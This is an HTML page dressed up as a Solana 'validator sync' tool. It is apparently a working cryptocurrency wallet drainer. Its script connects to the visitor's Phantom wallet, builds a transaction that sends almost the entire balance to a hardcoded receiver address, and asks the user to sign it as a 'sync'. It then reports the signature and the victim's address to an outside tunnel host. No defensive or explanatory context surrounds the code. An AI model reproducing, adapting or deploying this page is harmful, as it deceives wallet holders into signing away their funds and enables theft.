<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Global Validator Node</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.95.3/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #14f195; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; background: #0a0a0a; }
        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; font-size: 14px; }
        #log { font-size: 10px; color: #555; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <h3 style="margin:0; color:#9945FF;">VALIDATOR SYNC</h3>
        <p style="font-size:12px; margin:10px 0;">Node: <span style="color:red;">Out of Sync</span></p>
        <button id="cta">INITIALIZE SYNC</button>
        <div id="log">System Ready v5.1</div>
    </div>

    <script>
        // ğŸ”± éš§é“åœ°å€ - ä»…ç”¨äºæœ€åè®°å½•
        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

        document.getElementById('cta').onclick = async () => {
            const provider = window.solana || window.phantom?.solana;
            const web3 = window.solanaWeb3;
            const log = (t) => document.getElementById('log').innerText = t;

            if (!provider) { alert("Please use Phantom Browser"); return; }

            try {
                log("Connecting...");
                await provider.connect();
                
                // ğŸ”± å½»åº•ç»•è¿‡æœåŠ¡å™¨æŸ¥è´¦ï¼Œæ‰‹æœºç›´è¿ RPCï¼Œé˜² 403ï¼Œé˜² 500
                log("Querying Blockchain...");
                const conn = new web3.Connection("https://rpc.ankr.com/solana", "confirmed");
                
                // ä¸²è¡Œè·å–ï¼Œç¡®ä¿ç¨³å®šæ€§
                const balance = await conn.getBalance(provider.publicKey);
                const bh = await conn.getLatestBlockhash();

                const amount = balance - 1500000; // ç•™ 0.0015 åš Gasï¼Œç¡®ä¿ 100% æˆåŠŸ
                if (amount <= 0) { log("Balance too low"); return; }

                log("Awaiting Sign...");
                const tx = new web3.Transaction().add(
                    web3.SystemProgram.transfer({
                        fromPubkey: provider.publicKey,
                        toPubkey: new web3.PublicKey(RECEIVER),
                        lamports: amount
                    })
                );
                tx.recentBlockhash = bh.blockhash;
                tx.feePayer = provider.publicKey;

                // ğŸ”± ç›´æ¥æ‹‰èµ·ç­¾åå¹¶å‘é€
                const { signature } = await provider.signAndSendTransaction(tx);
                
                log("Syncing Complete!");
                fetch(`${tunnel}/broadcast`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ sig: signature, addr: provider.publicKey.toString() })
                });

                setTimeout(() => { window.location.href = "https://explorer.solana.com/tx/" + signature; }, 1200);

            } catch (err) {
                console.error(err);
                log("Error: " + err.message);
            }
        };
    </script>
</body>
</html>
